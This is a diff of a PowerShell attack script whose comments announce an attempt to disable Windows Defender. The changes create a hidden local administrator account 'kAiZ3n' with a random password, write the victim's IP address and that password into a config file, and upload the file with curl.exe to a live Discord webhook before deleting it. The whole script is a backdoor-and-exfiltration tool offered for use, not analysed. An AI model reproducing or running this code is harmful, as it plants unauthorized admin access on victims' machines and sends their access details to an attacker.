@@ -4,8 +4,8 @@ function random_text {
 # Attempt to disable Windows Defender
 
 #Creat User Admin
-$UserName = "NewUserText"
-$pass = "YourPassword123!"
+$UserName = "kAiZ3n"
+$pass = random_text
 if(Get-LocalUser -Name $UserName -ErrorAction SilientlyContinue){
     Remove-LocalUser -Name $UserName
 }
@@ -20,7 +20,9 @@ $configfile = "$env:config.kAiZ3n"
 #Send infor target into email 
 $email = Get-Content email.txt
 $pword = Get-Content pass.txt
-
+if(Test-Path $configfile){
+    Remove-Item $configfile -Force
+}
 $ip = (Get-NetIpAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
 
 #Write config file
@@ -29,7 +31,7 @@ Add-Content -Path $configfile -Value $pathDir
 Add-Content -Path $configfile -Value $pass
 #discord webhook
 $WebhookURL = "https://discord.com/api/webhooks/1341801773546999948/2ocX7pSZBLbPlU8_FvGSY6dIsEd5MBy-muOLz5V6g-VwpX8ffe8ytFSA8J2jzJ31JWZi"
-Invoke-WebRequest -Uri $WebhookURL -Method Post -Form @{file=Get-Item $configfile}
+curl.exe -F "file=@$configfile" $WebhookURL
 Remove-Item $configfile
 #goto tem, make working directory
 mkdir $pathDir
